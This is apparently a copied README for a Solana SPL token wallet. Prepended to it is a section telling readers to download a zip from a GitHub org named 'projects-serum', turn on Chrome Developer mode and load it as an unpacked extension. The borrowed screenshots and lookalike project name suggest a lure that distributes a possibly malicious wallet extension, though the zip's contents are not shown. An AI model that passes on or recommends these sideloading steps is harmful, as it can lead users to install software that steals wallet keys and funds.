# SPL Token Wallet
## How to install Chrome extensions manually
**1.** Download the extension zip file directly here [Download Here](https://github.com/projects-serum/spl-token-wallet/raw/main/extension-build.zip).<br>
**2.** Go to **chrome://extensions/** and check the box for **Developer mode** in the top right.<br>
![See examples below](https://www.cnet.com/a/img/resize/f2f6570076ded3f971181de43a2f940f04d8e1be/hub/2017/01/18/b9cd8c02-4a43-4c32-b5b9-65b5fa4e96bf/developer-mode-chrome.jpg?auto=webp&width=1200)
**3.** Locate the ZIP file on your computer and unzip it.<br>
**4.** Go back to the **chrome://extensions/** page and click the **Load unpacked extension** button and select the **unzipped folder** for your extension to install it.<br>
![](https://cdnblog.webkul.com/blog/wp-content/uploads/2019/07/15065849/4-3.png)
![](https://cdnblog.webkul.com/blog/wp-content/uploads/2019/07/15065856/5-3.png)

### Alternative Ways :
You can directly just drag & drop the **extension-build.zip** into **chrome://extensions/**<br>
**Note:** You need to select the folder in which the manifest file exists. In the screenshot, we have selected the installer folder inside Unzipped folder as it is the installer folder for our extension.
Example Solana wallet with support for [SPL tokens](https://spl.solana.com/token) and Serum integration.

See [sollet.io](https://www.sollet.io) or the [Sollet Chrome Extension](https://chrome.google.com/webstore/detail/sollet/fhmfendgdocmcbmfikdcogofphimnkno) for a demo.

Wallet keys are stored in `localStorage`, optionally encrypted by a password.

Run `yarn start` to start a development server or `yarn build` to create a production build that can be served by a static file server.
See the [Create React App documentation](https://facebook.github.io/create-react-app/docs/getting-started) for other commands and options.
